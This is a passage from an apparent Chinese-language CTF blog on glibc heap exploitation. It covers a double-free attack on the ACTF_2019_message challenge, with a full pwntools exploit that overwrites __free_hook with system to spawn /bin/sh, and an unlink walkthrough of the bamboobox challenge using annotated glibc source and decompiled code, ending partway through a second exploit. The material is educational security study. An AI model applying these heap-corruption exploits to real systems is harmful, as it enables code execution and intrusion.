printf(\u0026#34;after free\\n\u0026#34;); } int main() { // 指定hook函数，现在hook函数不为NULL __malloc_hook = my_malloc_hook; __free_hook = my_free_hook; char *buffer = malloc(100); if (buffer) { snprintf(buffer, 100, \u0026#34;hook_demo\u0026#34;); printf(\u0026#34;%s\\n\u0026#34;, buffer); free(buffer); } return 0; } 1 2 3 4 5 6 // 理论上的输出会是下面这样 before malloc after malloc hook_demo before free after free 当然一直没有试验成功\u0026hellip;\u0026hellip;\n思路 正常double free后篡改fd伪造chunk，还需要申请三个chunk才会到伪造的chunk\n原本的sla是直接强转字符串加编码的，这里传送数据会有问题，所以单独拆出来发送数据\n泄露puts地址开始ret2libc\n__free_hook地址写入fake_chunk，system地址写入__free_hook，这时__free_hook不为空，后续调用free(ptr)就是在__free_hook(ptr)即system(ptr)\n最后在任意chunk写入/bin/sh再free即可调用syetem(\u0026quot;/bin/sh\u0026quot;)getshell\nexp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.terminal = [\u0026#34;tmux\u0026#34;,\u0026#34;splitw\u0026#34;,\u0026#34;-v\u0026#34;] io = process(\u0026#34;./copy_ACTF_2019_message\u0026#34;) elf = ELF(\u0026#34;./copy_ACTF_2019_message\u0026#34;) libc = ELF(\u0026#34;./libc-2.23.so\u0026#34;) #libc = elf.libc sla = lambda delim,data : io.sendlineafter(str(delim).encode(), str(data).encode()) rcu = lambda delim : io.recvuntil(str(delim).encode()) uu64 = lambda data :u64(data.ljust(8,b\u0026#39;\\0\u0026#39;)) def dbg(): gdb.attach(io) pause() def add(length, data): sla(\u0026#34;What\u0026#39;s your choice: \u0026#34;, 1) sla(\u0026#34;:\\n\u0026#34;, length) sla(\u0026#34;:\\n\u0026#34;, data) def delete(index): sla(\u0026#34;What\u0026#39;s your choice: \u0026#34;, 2) sla(\u0026#34;:\\n\u0026#34;, index) def edit(index, data): sla(\u0026#34;What\u0026#39;s your choice: \u0026#34;, 3) sla(\u0026#34;:\\n\u0026#34;, index) sla(\u0026#34;:\\n\u0026#34;, data) def show(index): sla(\u0026#34;What\u0026#39;s your choice: \u0026#34;, 4) sla(\u0026#34;:\\n\u0026#34;, index) add(0x30, \u0026#34;aaaa\u0026#34;) # chunk_0 add(0x20, \u0026#34;bbbb\u0026#34;) # chunk_1 add(0x20, \u0026#34;cccc\u0026#34;) # chunk_2 delete(1) delete(2) delete(1) fake_chunk = 0x602060 - 0x8 # b\u0026#39;X `\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\u0026#39;\\n #add(0x20, p64(fake_chunk)) # chunk_3 \u0026lt;-\u0026gt; chunk_1 sla(\u0026#34;What\u0026#39;s your choice: \u0026#34;, 1) sla(\u0026#34;:\\n\u0026#34;, 0x20) io.sendlineafter(\u0026#34;:\\n\u0026#34;, p64(fake_chunk)) puts_addr_got = elf.got[\u0026#39;puts\u0026#39;] success(f\u0026#34;puts_addr_got:{hex(puts_addr_got)}\u0026#34;) add(0x20, \u0026#34;dddd\u0026#34;) # chunk_4 \u0026lt;-\u0026gt; chunk_2 add(0x20, \u0026#34;eeee\u0026#34;) # chunk_5 \u0026lt;-\u0026gt; chunk_1 #add(0x20, p64(puts_addr_got)) # chunk_6 \u0026lt;-\u0026gt; fake_chunk \u0026lt;-\u0026gt; chunk_0 sla(\u0026#34;What\u0026#39;s your choice: \u0026#34;, 1) sla(\u0026#34;:\\n\u0026#34;, 0x20) io.sendlineafter(\u0026#34;:\\n\u0026#34;, p64(puts_addr_got)) # get puts_addr show(0) response = rcu(\u0026#34;\\n\u0026#34;) message = response.split(b\u0026#39;The message: \u0026#39;)[-1].strip() # remove 0x0a puts_addr = uu64(message) success(f\u0026#34;puts_addr:{hex(puts_addr)}\u0026#34;) # ret2libc puts_offset = libc.sym[\u0026#39;puts\u0026#39;] libc_base = puts_addr - puts_offset system_addr = libc_base + libc.sym[\u0026#39;system\u0026#39;] free_hook_addr = libc_base + libc.sym[\u0026#39;__free_hook\u0026#39;] success(f\u0026#34;system_addr:{hex(system_addr)}\u0026#34;) success(f\u0026#34;__free_hook_addr:{hex(free_hook_addr)}\u0026#34;) # 虽然chunk_6和chunk_0本质上都是等价的，但是对于两个chunk的操作是不同的 # chunk_6是free状态的chunk_0，往里面写数据改的是指针 # chunk_0是inuse状态的，往里面写数据是往地址写数据，后面就变成了往__free_hook写system了 # edit chunk_6 \u0026lt;-\u0026gt; fake_chunk \u0026lt;-\u0026gt; chunk_0 sla(\u0026#34;What\u0026#39;s your choice: \u0026#34;, 3) sla(\u0026#34;:\\n\u0026#34;, 6) io.sendlineafter(\u0026#34;:\\n\u0026#34;, p64(free_hook_addr)) #edit chunk_0 sla(\u0026#34;What\u0026#39;s your choice: \u0026#34;, 3) sla(\u0026#34;:\\n\u0026#34;, 0) io.sendlineafter(\u0026#34;:\\n\u0026#34;, p64(system_addr)) # add chunk_7 sla(\u0026#34;What\u0026#39;s your choice: \u0026#34;, 1) sla(\u0026#34;:\\n\u0026#34;, 0x8) io.sendlineafter(\u0026#34;:\\n\u0026#34;, \u0026#34;/bin/sh\u0026#34;) delete(7) io.interactive() issue 为什么第一个chunk要设置为0x30而不是0x20 ?\n对于fastbin的malloc会检查chunk的size字段是否相等，是为了满足这一条件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 // glibc 2.23 void * __libc_malloc (size_t bytes) { mstate ar_ptr; void *victim; void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) // 检查__malloc_hook是否为UNLL return (*hook)(bytes, RETURN_ADDRESS (0)); // 调用__malloc_hook arena_get (ar_ptr, bytes); // 内存分配 victim = _int_malloc (ar_ptr, bytes); // 处理内存各类分配策略，包括fastbin smallbin... /* Retry with another arena only if we were able to find a usable arena before. */ if (!victim \u0026amp;\u0026amp; ar_ptr != NULL) // 多线程处理逻辑 { LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); } if (ar_ptr != NULL) (void) mutex_unlock (\u0026amp;ar_ptr-\u0026gt;mutex); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim))); return victim; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 // malloc.c --\u0026gt; _int_malloc /* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. */ if ((unsigned long) (nb) \u0026lt;= (unsigned long) (get_max_fast ())) // 判断是否是fastbin { idx = fastbin_index (nb); mfastbinptr *fb = \u0026amp;fastbin (av, idx); mchunkptr pp = *fb; do // 获取空闲块 { victim = pp; if (victim == NULL) break; } while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-\u0026gt;fd, victim)) != victim); if (victim != 0) { if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)) // 检查chunk的size { errstr = \u0026#34;malloc(): memory corruption (fast)\u0026#34;; errout: malloc_printerr (check_action, errstr, chunk2mem (victim), av); return NULL; } check_remalloced_chunk (av, victim, nb); // fastbin重新分配为chunk void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } } 为什么选择__free_hook而不是__malloc_hook ?\n__malloc_hook的利用需要在__malloc_hook附近伪造chunk来进行覆盖，而__free_hook却不用这么麻烦 由于malloc的参数一般都是size，参数填/bin/sh不起作用，对于__malloc_hook的利用一般是gadget；free的参数是ptr正好可用使用/bin/sh的ptr调用system(\u0026quot;/bin/sh\u0026quot;) 总结 double free的利用思路\n后门 攻击__malloc_hook\u0026amp;\u0026amp;__free_hook chunk分配到got表劫持函数 ","date":"2024-10-27T19:05:12+08:00","permalink":"https://Pwn3r4llD4ys.github.io/p/double_free/","title":"Double_free"},{"content":"unlink 基本原理 chunk被free后放入双向链表（fastbins除外），通过篡改fd bk指针后绕过unlink的检测实现任意地址读的漏洞\n利用条件 修改chunk的p标志位\noff-by-null\noff-by-one\n堆溢出\n低版本的glibc\nglibc2.38相关源码分析 unlink 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 // unlink from /malloc/malloc.c // 实现free后的chunk从空闲链表中移除 static void unlink_chunk (mstate av, mchunkptr p) // av即内存分配状态，p为待移除的目标chunk指针 { if (chunksize (p) != prev_size (next_chunk (p))) // 检查当前chunk的szie是否等于下一个chunk的pre_size malloc_printerr (\u0026#34;corrupted size vs. prev_size\u0026#34;); mchunkptr fd = p-\u0026gt;fd; // 指向上一个chunk mchunkptr bk = p-\u0026gt;bk; // 指向下一个chunk if (__builtin_expect (fd-\u0026gt;bk != p || bk-\u0026gt;fd != p, 0)) // 检查双向链表的完整性，后续对该条件进行绕过 malloc_printerr (\u0026#34;corrupted double-linked list\u0026#34;); fd-\u0026gt;bk = bk; // 修改指针移除chunk bk-\u0026gt;fd = fd; if (!in_smallbin_range (chunksize_nomask (p)) \u0026amp;\u0026amp; p-\u0026gt;fd_nextsize != NULL) // 判断是否为large bins { // large bins还要检查fd_nextsize和bk_nextsize if (p-\u0026gt;fd_nextsize-\u0026gt;bk_nextsize != p || p-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize != p) malloc_printerr (\u0026#34;corrupted double-linked list (not small)\u0026#34;); if (fd-\u0026gt;fd_nextsize == NULL) // 条件为真即fd为large bins中的唯一chunk，链表还未初始化 { // 链表初始化 if (p-\u0026gt;fd_nextsize == p) fd-\u0026gt;fd_nextsize = fd-\u0026gt;bk_nextsize = fd; else { fd-\u0026gt;fd_nextsize = p-\u0026gt;fd_nextsize; fd-\u0026gt;bk_nextsize = p-\u0026gt;bk_nextsize; p-\u0026gt;fd_nextsize-\u0026gt;bk_nextsize = fd; p-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = fd; } } else { p-\u0026gt;fd_nextsize-\u0026gt;bk_nextsize = p-\u0026gt;bk_nextsize; p-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = p-\u0026gt;fd_nextsize; } } } free 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 // free from /malloc/malloc.c static void _int_free (mstate av, mchunkptr p, int have_lock) // av为内存状态分配器的状态 p为chunk指针 have_lock指示当前线程是否有arena的锁，多线程下依据此参数避免竞争条件 { INTERNAL_SIZE_T size; /* its size */ mfastbinptr *fb; /* associated fastbin */ mchunkptr nextchunk; /* next contiguous chunk */ INTERNAL_SIZE_T nextsize; /* its size */ int nextinuse; /* true if nextchunk is used */ INTERNAL_SIZE_T prevsize; /* size of previous contiguous chunk */ mchunkptr bck; /* misc temp for linking */ mchunkptr fwd; /* misc temp for linking */ size = chunksize (p); /* Little security check which won\u0026#39;t hurt performance: the allocator never wraps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by \u0026#34;design\u0026#34; from some intruder. */ // 安全性检查：确保指针p不越界，也不处于无效的地址空间 if (__builtin_expect ((uintptr_t) p \u0026gt; (uintptr_t) -size, 0) || __builtin_expect (misaligned_chunk (p), 0)) malloc_printerr (\u0026#34;free(): invalid pointer\u0026#34;); /* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */ // 检查chunk的大小是否符合最小分配单位以及内存对齐的要求 if (__glibc_unlikely (size \u0026lt; MINSIZE || !aligned_OK (size))) malloc_printerr (\u0026#34;free(): invalid size\u0026#34;); check_inuse_chunk(av, p); // 检查in_use标志位 #if USE_TCACHE // 如果启用了tcache机制，则优先使用tcache处理 { size_t tc_idx = csize2tidx (size); if (tcache != NULL \u0026amp;\u0026amp; tc_idx \u0026lt; mp_.tcache_bins) { /* Check to see if it\u0026#39;s already in the tcache. */ // 检查tcache中是否已经包含此chunk，避免双重释放 tcache_entry *e = (tcache_entry *) chunk2mem (p); /* This test succeeds on double free. However, we don\u0026#39;t 100% trust it (it also matches random payload data at a 1 in 2^\u0026lt;size_t\u0026gt; chance), so verify it\u0026#39;s not an unlikely coincidence before aborting. */ if (__glibc_unlikely (e-\u0026gt;key == tcache_key)) // 检查key { tcache_entry *tmp; size_t cnt = 0; LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache-\u0026gt;entries[tc_idx]; tmp; tmp = REVEAL_PTR (tmp-\u0026gt;next), ++cnt) { if (cnt \u0026gt;= mp_.tcache_count) malloc_printerr (\u0026#34;free(): too many chunks detected in tcache\u0026#34;); if (__glibc_unlikely (!aligned_OK (tmp))) malloc_printerr (\u0026#34;free(): unaligned chunk detected in tcache 2\u0026#34;); if (tmp == e) malloc_printerr (\u0026#34;free(): double free detected in tcache 2\u0026#34;); /* If we get here, it was a coincidence. We\u0026#39;ve wasted a few cycles, but don\u0026#39;t abort. */ } } if (tcache-\u0026gt;counts[tc_idx] \u0026lt; mp_.tcache_count) { tcache_put (p, tc_idx); // 放入tcachebin return; } } } #endif /* If eligible, place chunk on a fastbin so it can be found and used quickly in malloc. */ // 检查chunk是否可以放入fastbin if ((unsigned long)(size) \u0026lt;= (unsigned long)(get_max_fast ()) #if TRIM_FASTBINS /* If TRIM_FASTBINS set, don\u0026#39;t place chunks bordering top into fastbins */ \u0026amp;\u0026amp; (chunk_at_offset(p, size) != av-\u0026gt;top) #endif ) { if (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size)) \u0026lt;= CHUNK_HDR_SZ, 0) || __builtin_expect (chunksize (chunk_at_offset (p, size)) \u0026gt;= av-\u0026gt;system_mem, 0)) { bool fail = true; /* We might not have a lock at this point and concurrent modifications of system_mem might result in a false positive. Redo the test after getting the lock. */ if (!have_lock) { __libc_lock_lock (av-\u0026gt;mutex); fail = (chunksize_nomask (chunk_at_offset (p, size)) \u0026lt;= CHUNK_HDR_SZ || chunksize (chunk_at_offset (p, size)) \u0026gt;= av-\u0026gt;system_mem); __libc_lock_unlock (av-\u0026gt;mutex); } if (fail) malloc_printerr (\u0026#34;free(): invalid next size (fast)\u0026#34;); } free_perturb (chunk2mem(p), size - CHUNK_HDR_SZ); atomic_store_relaxed (\u0026amp;av-\u0026gt;have_fastchunks, true); unsigned int idx = fastbin_index(size); fb = \u0026amp;fastbin (av, idx); /* Atomically link P to its fastbin: P-\u0026gt;FD = *FB; *FB = P; */ mchunkptr old = *fb, old2; if (SINGLE_THREAD_P) { /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) malloc_printerr (\u0026#34;double free or corruption (fasttop)\u0026#34;); p-\u0026gt;fd = PROTECT_PTR (\u0026amp;p-\u0026gt;fd, old); *fb = p; } else do { /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) malloc_printerr (\u0026#34;double free or corruption (fasttop)\u0026#34;); old2 = old; p-\u0026gt;fd = PROTECT_PTR (\u0026amp;p-\u0026gt;fd, old); } while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2); /* Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding. We can dereference OLD only if we have the lock, otherwise it might have already been allocated again. */ if (have_lock \u0026amp;\u0026amp; old != NULL \u0026amp;\u0026amp; __builtin_expect (fastbin_index (chunksize (old)) != idx, 0)) malloc_printerr (\u0026#34;invalid fastbin entry (free)\u0026#34;); } /* Consolidate other non-mmapped chunks as they arrive. */ else if (!chunk_is_mmapped(p)) { /* If we\u0026#39;re single-threaded, don\u0026#39;t lock the arena. */ if (SINGLE_THREAD_P) have_lock = true; if (!have_lock) __libc_lock_lock (av-\u0026gt;mutex); nextchunk = chunk_at_offset(p, size); /* Lightweight tests: check whether the block is already the top block. */ if (__glibc_unlikely (p == av-\u0026gt;top)) malloc_printerr (\u0026#34;double free or corruption (top)\u0026#34;); /* Or whether the next chunk is beyond the boundaries of the arena. */ if (__builtin_expect (contiguous (av) \u0026amp;\u0026amp; (char *) nextchunk \u0026gt;= ((char *) av-\u0026gt;top + chunksize(av-\u0026gt;top)), 0)) malloc_printerr (\u0026#34;double free or corruption (out)\u0026#34;); /* Or whether the block is actually not marked used. */ if (__glibc_unlikely (!prev_inuse(nextchunk))) malloc_printerr (\u0026#34;double free or corruption (!prev)\u0026#34;); nextsize = chunksize(nextchunk); if (__builtin_expect (chunksize_nomask (nextchunk) \u0026lt;= CHUNK_HDR_SZ, 0) || __builtin_expect (nextsize \u0026gt;= av-\u0026gt;system_mem, 0)) malloc_printerr (\u0026#34;free(): invalid next size (normal)\u0026#34;); free_perturb (chunk2mem(p), size - CHUNK_HDR_SZ); /* consolidate backward */ // 向前合并chunk即合并上一个chunk if (!prev_inuse(p)) { prevsize = prev_size (p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); // p指针指向上一个chunk if (__glibc_unlikely (chunksize(p) != prevsize)) malloc_printerr (\u0026#34;corrupted size vs. prev_size while consolidating\u0026#34;); unlink_chunk (av, p); } if (nextchunk != av-\u0026gt;top) { /* get and clear inuse bit */ nextinuse = inuse_bit_at_offset(nextchunk, nextsize); // 检查下一个chunk是否被使用 /* consolidate forward */ // 向后合并chunk即合并下一个chunk，p指针不用移动 if (!nextinuse) { unlink_chunk (av, nextchunk); size += nextsize; } else clear_inuse_bit_at_offset(nextchunk, 0);// 清除in_use标志位 /* Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc. */ // 将chunk放入unsorted bin bck = unsorted_chunks(av); fwd = bck-\u0026gt;fd; if (__glibc_unlikely (fwd-\u0026gt;bk != bck)) malloc_printerr (\u0026#34;free(): corrupted unsorted chunks\u0026#34;); p-\u0026gt;fd = fwd; p-\u0026gt;bk = bck; if (!in_smallbin_range(size)) // 检查chunk大小是否属于small bins { p-\u0026gt;fd_nextsize = NULL; p-\u0026gt;bk_nextsize = NULL; } bck-\u0026gt;fd = p; fwd-\u0026gt;bk = p; set_head(p, size | PREV_INUSE); set_foot(p, size); check_free_chunk(av, p); } /* If the chunk borders the current high end of memory, consolidate into top */ // chunk如果和top_chunk相邻合并到top_chunk else { size += nextsize; set_head(p, size | PREV_INUSE); av-\u0026gt;top = p; check_chunk(av, p); } /* If freeing a large space, consolidate possibly-surrounding chunks. Then, if the total unused topmost memory exceeds trim threshold, ask malloc_trim to reduce top. Unless max_fast is 0, we don\u0026#39;t know if there are fastbins bordering top, so we cannot tell for sure whether threshold has been reached unless fastbins are consolidated. But we don\u0026#39;t want to consolidate on each free. As a compromise, consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD is reached. */ // 超过合并阈值的chunk的合并 if ((unsigned long)(size) \u0026gt;= FASTBIN_CONSOLIDATION_THRESHOLD) { if (atomic_load_relaxed (\u0026amp;av-\u0026gt;have_fastchunks)) malloc_consolidate(av); if (av == \u0026amp;main_arena) { #ifndef MORECORE_CANNOT_TRIM if ((unsigned long)(chunksize(av-\u0026gt;top)) \u0026gt;= (unsigned long)(mp_.trim_threshold)) systrim(mp_.top_pad, av); #endif } else { /* Always try heap_trim(), even if the top chunk is not large, because the corresponding heap might go away. */ heap_info *heap = heap_for_ptr(top(av)); assert(heap-\u0026gt;ar_ptr == av); heap_trim(heap, mp_.top_pad); } } if (!have_lock) __libc_lock_unlock (av-\u0026gt;mutex); } /* If the chunk was allocated via mmap, release via munmap(). */ else { munmap_chunk (p); // 通过mmap分配的chunk用mumap释放 } } 利用分析 伪造chunk，构造fd和bk\n通常在某个chunk的data区伪造chunk，令FD为fake_chunk - 3 * sizeof(int)，令BK为fake_chunk - 2 * sizeof(int)\n堆溢出伪造chunk\nFD-\u0026gt;bk != p || BK-\u0026gt;fd != p绕过\n这里利用了glibc无法识别chunk结构体的缺陷，结构体指针访问成员变量的过程本质上就是结构体指针偏移，对于fd为ptr + 2 * sizeof(int)，对于bk为ptr + 3 * sizeof(int)，经过指针的运算就可以绕过该条件\n图示环境为x64机器\nFD-\u0026gt;bk = bk\n经过上面的构造，这里就是把指针bk赋值给fake_chunk，也就是fake_chunk = fake_chunk - 2 * sizeof(int)\nBK-\u0026gt;fd = fd\n这里是fake_chunk = fake_chunk - 3 * sizeof(int)\n编辑数据，访问fake_chunk\n为什么这里的fake_chunk-0x18会多一步解引用的操作？\n当把fake_chunk篡改为fake_chunk-0x18时，堆管理器会认为fake_chunk-0x18是fd的地址，这时访问fake_chunk-0x18等同于访问fd，对于的fd的操作自然会先对指针解引用，这也就是为什么可以控制地址跳跃到fake_chunk-0x18\n反过来想，如果真的可以随意修改指针，也就没什么必要修改got表了\u0026hellip;\u0026hellip;\n第二次访问fake_chunk就会跳到函数的got表项的位置，此时就可以篡改函数地址\nbamboobox main 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 int __fastcall main(int argc, const char **argv, const char **envp) { void (**fun_ptr)(void); // [rsp+8h] [rbp-18h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 canary_0; // [rsp+18h] [rbp-8h] canary_0 = __readfsqword(0x28u); // 读取canary检测栈溢出 setvbuf(stdout, 0LL, 2, 0LL); // 标准输入输出设置为无缓冲模式 setvbuf(stdin, 0LL, 2, 0LL); fun_ptr = (void (**)(void))malloc(0x10uLL); // 申请可存放两个函数指针的空间 *fun_ptr = (void (*)(void))hello_message; fun_ptr[1] = (void (*)(void))goodbye_message; (*fun_ptr)(); // hello_message() while ( 1 ) { menu(); read(0, buf, 8uLL); switch ( atoi(buf) ) { case 1: show_item(); // 展示信息 break; case 2: add_item(); // 添加 break; case 3: change_item(); break; case 4: remove_item(); // 移除 break; case 5: fun_ptr[1](); // goodbye_message() exit(0); default: puts(\u0026#34;invaild choice!!!\u0026#34;); break; } } } show_item 1 2 3 4 5 6 7 8 9 10 11 12 13 14 int show_item() { int i; // [rsp+Ch] [rbp-4h] if ( !num ) return puts(\u0026#34;No item in the box\u0026#34;); for ( i = 0; i \u0026lt;= 99; ++i ) // 遍历item并输出 { // unk_6020C8对应的地址是0x6020C8，位于.bss段，存放未初始化的全局变量和静态变量 if ( *((_QWORD *)\u0026amp;unk_6020C8 + 2 * i) ) printf(\u0026#34;%d : %s\u0026#34;, (unsigned int)i, *((const char **)\u0026amp;unk_6020C8 + 2 * i)); } return puts(byte_401089); } add_item 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 __int64 add_item() { int i; // [rsp+4h] [rbp-1Ch] int buf_int; // [rsp+8h] [rbp-18h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 canary_1; // [rsp+18h] [rbp-8h] canary_1 = __readfsqword(0x28u); //读取canary if ( num \u0026gt; 99 ) { puts(\u0026#34;the box is full\u0026#34;); } else { printf(\u0026#34;Please enter the length of item name:\u0026#34;); read(0, buf, 8uLL); buf_int = atoi(buf); if ( !buf_int ) { puts(\u0026#34;invaild length\u0026#34;); return 0LL; } for ( i = 0; i \u0026lt;= 99; ++i ) { if ( !*((_QWORD *)\u0026amp;unk_6020C8 + 2 * i) ) // 判断内存地址中是否有东西 { *((_DWORD *)\u0026amp;itemlist + 4 * i) = buf_int; // 长度写入itemlist *((_QWORD *)\u0026amp;unk_6020C8 + 2 * i) = malloc(buf_int); // 将malloc返回的指针存放在.bss段 printf(\u0026#34;Please enter the name of item:\u0026#34;); *(_BYTE *)(*((_QWORD *)\u0026amp;unk_6020C8 + 2 * i) + (int)read(0, *((void **)\u0026amp;unk_6020C8 + 2 * i), buf_int)) = 0; // 首先调用read()在.bss段上写数据，把返回值转为整型加上首地址，此时正好到数据的末尾，在末尾补0表示c中的数据截断 ++num; // num_item++ return 0LL; } } } return 0LL; } 1 2 3 4 5 6 7 *((_DWORD *)\u0026amp;itemlist + 4 * i) = buf_int; *((_QWORD *)\u0026amp;unk_6020C8 + 2 * i) = malloc(buf_int); // 上面两行代码可抽象为下面的结构体 struct item { int length; // 占用 4 字节 char *item_name; // 指向物品名称的指针，占用 8 字节 }; change_item 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 unsigned __int64 change_item() { int index; // [rsp+4h] [rbp-2Ch] int length_int; // [rsp+8h] [rbp-28h] char buf[16]; // [rsp+10h] [rbp-20h] BYREF char length[8]; // [rsp+20h] [rbp-10h] BYREF unsigned __int64 canary_2; // [rsp+28h] [rbp-8h] canary_2 = __readfsqword(0x28u); // 获取canary if ( num ) // item数量不为0 { printf(\u0026#34;Please enter the index of item:\u0026#34;); read(0, buf, 8uLL); index = atoi(buf); if ( *((_QWORD *)\u0026amp;unk_6020C8 + 2 * index) ) // 因为是change，要求目标内存有东西 { printf(\u0026#34;Please enter the length of item name:\u0026#34;); read(0, length, 8uLL); // length大小没有限制，有堆溢出漏洞 length_int = atoi(length); printf(\u0026#34;Please enter the new name of the item:\u0026#34;); // 同add_item一样。都是给内存数据截断 *(_BYTE *)(*((_QWORD *)\u0026amp;unk_6020C8 + 2 * index) + (int)read(0, *((void **)\u0026amp;unk_6020C8 + 2 * index), length_int)) = 0; } else { puts(\u0026#34;invaild index\u0026#34;); } } else { puts(\u0026#34;No item in the box\u0026#34;); } return __readfsqword(0x28u) ^ canary_2; // 通过异或检查是否有栈溢出 } remove_item 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 unsigned __int64 remove_item() { int index_; // [rsp+Ch] [rbp-14h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 canary_3; // [rsp+18h] [rbp-8h] canary_3 = __readfsqword(0x28u); // 获取canary if ( num ) { printf(\u0026#34;Please enter the index of item:\u0026#34;); read(0, buf, 8uLL); index_ = atoi(buf); if ( *((_QWORD *)\u0026amp;unk_6020C8 + 2 * index_) ) // 移除item要求目标内存有item { free(*((void **)\u0026amp;unk_6020C8 + 2 * index_)); // free *((_QWORD *)\u0026amp;unk_6020C8 + 2 * index_) = 0LL; // 将指针置0 *((_DWORD *)\u0026amp;itemlist + 4 * index_) = 0; // 长度置0 puts(\u0026#34;remove successful!!\u0026#34;); --num; // item_num-- } else { puts(\u0026#34;invaild index\u0026#34;); } } else { puts(\u0026#34;No item in the box\u0026#34;); } return __readfsqword(0x28u) ^ canary_3; // 检查canary } 后门函数magic 1 2 3 4 5 6 7 8 9 10 11 12 13 void __noreturn magic() // 打开文件输出其内容 { int fd; // [rsp+Ch] [rbp-74h] char buf[104]; // [rsp+10h] [rbp-70h] BYREF unsigned __int64 v2; // [rsp+78h] [rbp-8h] v2 = __readfsqword(0x28u); fd = open(\u0026#34;/home/bamboobox/flag\u0026#34;, 0); read(fd, buf, 0x64uLL); close(fd); printf(\u0026#34;%s\u0026#34;, buf); exit(0); } exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 from pwn import * context.os = \u0026#39;linux\u0026#39; context.log_level = \u0026#39;debug\u0026#39; context.arch = \u0026#39;amd64\u0026#39; # ctrl + b \u0026#34; context.terminal = [\u0026#34;tmux\u0026#34;,\u0026#34;splitw\u0026#34;,\u0026#34;-v\u0026#34;] io = process(\u0026#34;./copy_bamboobox\u0026#34;) elf = ELF(\u0026#34;./copy_bamboobox\u0026#34;) libc = ELF(\u0026#34;./libc-2.23.so\u0026#34;) # 1 -\u0026gt; 打印信息 def show(): io.sendlineafter(b\u0026#34;Your choice:\u0026#34;, b\u0026#34;1\u0026#34;) # 2 -\u0026gt; 创建item def add(length, data): io.sendlineafter(b\u0026#34;Your choice:\u0026#34;, b\u0026#34;2\u0026#34;) io.sendlineafter(b\u0026#34;Please enter the length of item name:\u0026#34;, str(length).encode()) io.sendlineafter(b\u0026#34;Please enter the name of item:\u0026#34;, data) # 3 -\u0026gt; 修改item def change(index, length, data): io.sendlineafter(b\u0026#34;Your choice:\u0026#34;, 